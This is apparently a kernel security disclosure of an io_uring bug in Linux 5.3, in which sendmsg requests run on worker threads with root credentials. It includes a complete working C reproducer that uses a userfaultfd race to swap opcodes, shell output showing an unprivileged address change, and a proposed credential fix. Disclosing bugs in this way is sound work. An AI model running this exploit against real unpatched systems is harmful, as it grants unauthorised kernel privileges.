/* Since commit 0fa03c624d8f ("io_uring: add support for sendmsg()", first in v5.3),
io_uring has support for asynchronously calling sendmsg().
Unprivileged userspace tasks can submit IORING_OP_SENDMSG submission queue
entries, which cause sendmsg() to be called either in syscall context in the
original task, or - if that wasn't able to send a message without blocking - on
a kernel worker thread.

The problem is that sendmsg() can end up looking at the credentials of the
calling task for various reasons; for example:

 - sendmsg() with non-null, non-abstract ->msg_name on an unconnected AF_UNIX
   datagram socket ends up performing filesystem access checks
 - sendmsg() with SCM_CREDENTIALS on an AF_UNIX socket ends up looking at
   process credentials
 - sendmsg() with non-null ->msg_name on an AF_NETLINK socket ends up performing
   capability checks against the calling process

When the request has been handed off to a kernel worker task, all such checks
are performed against the credentials of the worker - which are default kernel
creds, with UID 0 and full capabilities.

To force io_uring to hand off a request to a kernel worker thread, an attacker
can abuse the fact that the opcode field of the SQE is read multiple times, with
accesses to the struct msghdr in between: The attacker can first submit an SQE
of type IORING_OP_RECVMSG whose struct msghdr is in a userfaultfd region, and
then, when the userfaultfd triggers, switch the type to IORING_OP_SENDMSG.

Here's a reproducer for Linux 5.3 that demonstrates the issue by adding an
IPv4 address to the loopback interface without having the required privileges
for that:

//==========================================================================
*/
$ cat uring_sendmsg.c 
#define _GNU_SOURCE
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <err.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/ioctl.h>
#include <linux/rtnetlink.h>
#include <linux/if_addr.h>
#include <linux/io_uring.h>
#include <linux/userfaultfd.h>
#include <linux/netlink.h>

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})

static int uffd = -1;
static struct iovec *iov;
static struct iovec real_iov;
static struct io_uring_sqe *sqes;

static void *uffd_thread(void *dummy) {
  struct uffd_msg msg;
  int res = SYSCHK(read(uffd, &msg, sizeof(msg)));
  if (res != sizeof(msg)) errx(1, "uffd read");
  printf("got userfaultfd message\n");

  sqes[0].opcode = IORING_OP_SENDMSG;

  union {
    struct iovec iov;
    char pad[0x1000];
  } vec = {
    .iov = real_iov
  };
  struct uffdio_copy copy = {
    .dst = (unsigned long)iov,
    .src = (unsigned long)&vec,
    .len = 0x1000
  };
  SYSCHK(ioctl(uffd, UFFDIO_COPY, &copy));
  return NULL;
}

int main(void) {
  // initialize uring
  struct io_uring_params params = { };
  int uring_fd = SYSCHK(syscall(SYS_io_uring_setup, /*entries=*/10, &params));
  unsigned char *sq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING));
  unsigned char *cq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING));
  sqes = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES));

  // prepare userfaultfd-trapped IO vector page
  iov = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0));
  uffd = SYSCHK(syscall(SYS_userfaultfd, 0));
  struct uffdio_api api = { .api = UFFD_API, .features = 0 };
  SYSCHK(ioctl(uffd, UFFDIO_API, &api));
  struct uffdio_register reg = {
    .mode = UFFDIO_REGISTER_MODE_MISSING,
    .range = { .start = (unsigned long)iov, .len = 0x1000 }
  };
  SYSCHK(ioctl(uffd, UFFDIO_REGISTER, &reg));
  pthread_t thread;
  if (pthread_create(&thread, NULL, uffd_thread, NULL))
    errx(1, "pthread_create");

  // construct netlink message
  int sock = SYSCHK(socket(AF_NETLINK, SOCK_DGRAM, NETLINK_ROUTE));
  struct sockaddr_nl addr = {
    .nl_family = AF_NETLINK
  };
  struct {
    struct nlmsghdr hdr;
    struct ifaddrmsg body;
    struct rtattr opthdr;
    unsigned char addr[4];
  } __attribute__((packed)) msgbuf = {
    .hdr = {
      .nlmsg_len = sizeof(msgbuf),
      .nlmsg_type = RTM_NEWADDR,
      .nlmsg_flags = NLM_F_REQUEST
    },
    .body = {
      .ifa_family = AF_INET,
      .ifa_prefixlen = 32,
      .ifa_flags = IFA_F_PERMANENT,
      .ifa_scope = 0,
      .ifa_index = 1
    },
    .opthdr = {
      .rta_len = sizeof(struct rtattr) + 4,
      .rta_type = IFA_LOCAL
    },
    .addr = { 1, 2, 3, 4 }
  };
  real_iov.iov_base = &msgbuf;
  real_iov.iov_len = sizeof(msgbuf);
  struct msghdr msg = {
    .msg_name = &addr,
    .msg_namelen = sizeof(addr),
    .msg_iov = iov,
    .msg_iovlen = 1,
  };

  // send netlink message via uring
  sqes[0] = (struct io_uring_sqe) {
    .opcode = IORING_OP_RECVMSG,
    .fd = sock,
    .addr = (unsigned long)&msg
  };
  ((int*)(sq_ring + params.sq_off.array))[0] = 0;
  (*(int*)(sq_ring + params.sq_off.tail))++;
  int submitted = SYSCHK(syscall(SYS_io_uring_enter, uring_fd, /*to_submit=*/1, /*min_complete=*/1, /*flags=*/IORING_ENTER_GETEVENTS, /*sig=*/NULL, /*sigsz=*/0));
  printf("submitted %d, getevents done\n", submitted);
  int cq_tail = *(int*)(cq_ring + params.cq_off.tail);
  printf("cq_tail = %d\n", cq_tail);
  if (cq_tail != 1) errx(1, "expected cq_tail==1");
  struct io_uring_cqe *cqe = (void*)(cq_ring + params.cq_off.cqes);
  if (cqe->res < 0) {
    printf("result: %d (%s)\n", cqe->res, strerror(-cqe->res));
  } else {
    printf("result: %d\n", cqe->res);
  }
}
$ gcc -Wall -pthread -o uring_sendmsg uring_sendmsg.c
$ ip addr show dev lo
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
$ ./uring_sendmsg 
got userfaultfd message
submitted 1, getevents done
cq_tail = 1
result: 32
$ ip addr show dev lo
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet 1.2.3.4/32 scope global lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
$ 
/*==========================================================================

The way I see it, the easiest way to fix this would probably be to grab a
reference to the caller's credentials with get_current_cred() in
io_uring_create(), then let the entry code of all the kernel worker threads
permanently install these as their subjective credentials with override_creds().
(Or maybe commit_creds() - that would mean that you could actually see the
owning user of these threads in the output of something like "ps aux". On the
other hand, I'm not sure how that impacts stuff like signal sending, so
override_creds() might be safer.) It would mean that you can't safely use an
io_uring instance across something like a setuid() transition that drops
privileges, but that's probably not a big problem?

While the security bug was only introduced by the addition of IORING_OP_SENDMSG,
it would probably be beneficial to mark such a change for backporting all the
way to v5.1, when io_uring was added - I think e.g. the SELinux hook that is
called from rw_verify_area() has so far always attributed all the I/O operations
to the kernel context, which isn't really a security problem, but might e.g.
cause unexpected denials depending on the SELinux policy.
*/
